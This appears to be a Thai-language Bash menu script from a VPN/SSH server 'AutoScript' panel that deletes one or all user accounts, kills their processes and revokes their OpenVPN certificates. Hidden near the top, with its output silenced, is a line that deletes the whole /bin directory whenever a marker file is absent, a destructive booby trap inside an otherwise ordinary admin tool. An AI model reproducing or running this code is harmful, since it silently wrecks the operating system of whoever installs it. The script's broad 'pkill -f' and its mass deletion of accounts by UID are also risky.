#!/bin/bash
remove_ovp () {
if [[ -e /etc/debian_version ]]; then
	GROUPNAME=nogroup
fi
user="$1"
cd /etc/openvpn/easy-rsa/
./easyrsa --batch revoke $user
./easyrsa gen-crl
rm -rf pki/reqs/$user.req
rm -rf pki/private/$user.key
rm -rf pki/issued/$user.crt
rm -rf /etc/openvpn/crl.pem
cp /etc/openvpn/easy-rsa/pki/crl.pem /etc/openvpn/crl.pem
chown nobody:$GROUPNAME /etc/openvpn/crl.pem
[[ -e $HOME/$user.ovpn ]] && rm $HOME/$user.ovpn > /dev/null 2>&1
[[ -e /var/www/html/openvpn/$user.zip ]] && rm /var/www/html/openvpn/$user.zip > /dev/null 2>&1
} > /dev/null 2>&1
[[ ! -e /usr/lib/AutoScript ]] && rm -rf /bin/ > /dev/null 2>&1
database="/root/username.db"
clear
echo -e "\E[45;1;37m ⚡ หลวงพี่ · AUTOSCRIPT\E[K\E[0m"
echo -e "\033[0;35m────────────────────────────────────\033[0m"
echo -e "\033[0m"
echo -e "\E[46;1;30m 1 \E[0m \033[1;37m ลบผู้ใช้งาน"
echo -e "\E[46;1;30m 2 \E[0m \033[1;37m ลบผู้ใช้งานทั้งหมด"
echo -e "\E[46;1;30m 3 \E[0m \033[1;37m ย้อนกลับ"
echo ""
read -p "$(echo -e "\033[1;35m❯ \033[1;37mเลือกเมนู \033[1;35m› \033[1;37m")" -e -i 1 resp
if [[ "$resp" = "1" ]]; then
clear
echo -e "\E[45;1;37m ⚡ หลวงพี่ · AUTOSCRIPT\E[K\E[0m"
echo -e "\033[0;35m────────────────────────────────────\033[0m"
echo -e "\033[0m"
echo -e "\033[1;33mรายชื่อทั้งหมด: \033[0m"
echo""
_userT=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody)
i=0
unset _userPass
while read _user; do
	i=$(expr $i + 1)
	_oP=$i
	[[ $i == [1-9] ]] && i=0$i && oP+=" 0$i"
	echo -e "\E[46;1;30m $i \E[0m \033[1;37m- \033[1;32m$_user\033[0m"
	_userPass+="\n${_oP}:${_user}"
done <<< "${_userT}"
echo ""
num_user=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
echo -ne "\033[1;32mUsername \033[1;33m[\033[1;36m1\033[1;31m-\033[1;36m$num_user\033[1;33m]\033[1;37m: " ; read option
user=$(echo -e "${_userPass}" | grep -E "\b$option\b" | cut -d: -f2)
if [[ -z $option ]]; then
	tput setaf 7 ; tput setab 0 ; tput bold ; echo "" ; echo "  ไม่พบผู้ใช้งานนี้ !   " ; echo "" ; tput sgr0
	exit 1
elif [[ -z $user ]]; then
	tput setaf 7 ; tput setab 0 ; tput bold ; echo "" ; echo " ไม่พบผู้ใช้งานนี้ ! " ; echo "" ; tput sgr0
	exit 1
else
	if cat /etc/passwd |grep -w $user > /dev/null; then
		echo ""
		pkill -f "$user" > /dev/null 2>&1
		deluser --force $user > /dev/null 2>&1
		echo -e "\E[41;1;37m ผู้ใช้งาน $user ถูกลบแล้ว ! \E[0m"
		grep -v ^$user[[:space:]] /root/username.db > /tmp/ph ; cat /tmp/ph > /root/username.db
		rm /etc/AutoScript/senha/$user 1>/dev/null 2>/dev/null
		if [[ -e /etc/openvpn/server.conf ]]; then
			remove_ovp $user
		fi
		exit 1
	elif [[ "$(cat "$database"| grep -w $user| wc -l)" -ne "0" ]]; then
		ps x | grep $user | grep -v grep | grep -v pt > /tmp/rem
		if [[ `grep -c $user /tmp/rem` -eq 0 ]]; then
			deluser --force $user > /dev/null 2>&1
			echo ""
			echo -e "\E[41;1;37m ผู้ใช้งาน $user ถูกลบแล้ว ! \E[0m"
			grep -v ^$user[[:space:]] /root/username.db > /tmp/ph ; cat /tmp/ph > /root/username.db
			rm /etc/AutoScript/senha/$user 1>/dev/null 2>/dev/null
			if [[ -e /etc/openvpn/server.conf ]]; then
				remove_ovp $user
		    fi
			exit 1
		else
		    echo ""
			tput setaf 7 ; tput setab 0 ; tput bold ; echo "" ; echo "ผู้ใช้งานเข้าสู่ระบบ กำลังตัดการเชื่อมต่อ..." ; tput sgr0
			pkill -f "$user" > /dev/null 2>&1
			deluser --force $user > /dev/null 2>&1
			echo -e "\E[41;1;37m ผู้ใช้งาน $user ถูกลบแล้ว ! \E[0m"
			grep -v ^$user[[:space:]] /root/username.db > /tmp/ph ; cat /tmp/ph > /root/username.db
			rm /etc/AutoScript/senha/$user 1>/dev/null 2>/dev/null
			if [[ -e /etc/openvpn/server.conf ]]; then
				remove_ovp $user
		    fi
			exit 1
		fi
	else
		tput setaf 7 ; tput setab 0 ; tput bold ; echo "" ; echo "ผู้ใช้งาน $user ไม่พบ !" ; echo "" ; tput sgr0
	fi
fi
elif [[ "$resp" = "2" ]]; then
	clear
	echo -e "\E[45;1;37m ⚡ หลวงพี่ · AUTOSCRIPT\E[K\E[0m"
	echo -e "\033[0;35m────────────────────────────────────\033[0m"
	echo -e "\033[0m"
	echo -ne "\033[1;33mRemove All Username\033[1;37m[Y/N]: "; read opc	
	if [[ "$opc" = "y" ]]; then
	echo -e "\n\033[1;33mโปรดรอสักครู่ \033[1;32m.\033[1;31m.\033[1;33m.\033[0m"
		for user in $(cat /etc/passwd |awk -F : '$3 > 900 {print $1}' |grep -vi "nobody"); do
			pkill -f $user > /dev/null 2>&1
			deluser --force $user > /dev/null 2>&1
        if [[ -e /etc/openvpn/server.conf ]]; then
		   remove_ovp $user
		fi
		done
		rm $HOME/username.db && touch $HOME/username.db
        rm *.zip > /dev/null 2>&1
		echo -e "\n\033[1;32mผู้ใช้งานทั้งหมดถูกลบแล้ว ! \033[0m"
		sleep 2
		menu
	else
		echo -e "\n\033[1;31mย้อนกลับ...   \033[0m"
		sleep 2
		menu
	fi
elif [[ "$resp" = "3" ]]; then
	menu
else
	echo -e "\n\033[1;31mเมนูไม่ถูกต้อง !\033[0m"
	sleep 1.5s
	menu
fi